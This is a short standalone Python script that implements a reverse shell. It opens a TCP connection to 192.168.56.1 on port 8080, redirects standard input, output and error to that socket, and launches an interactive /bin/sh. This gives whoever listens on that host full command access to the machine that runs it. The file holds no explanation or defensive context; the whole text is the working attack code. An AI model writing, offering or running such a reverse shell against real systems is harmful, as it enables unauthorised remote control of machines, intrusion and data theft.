#!/usr/bin/env python
import socket,subprocess,os;

LHOST = '192.168.56.1'
LPORT = 8080

def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect((LHOST,LPORT));
    os.dup2(s.fileno(),0); 
    os.dup2(s.fileno(),1); 
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);

if __name__ == '__main__':
    main()
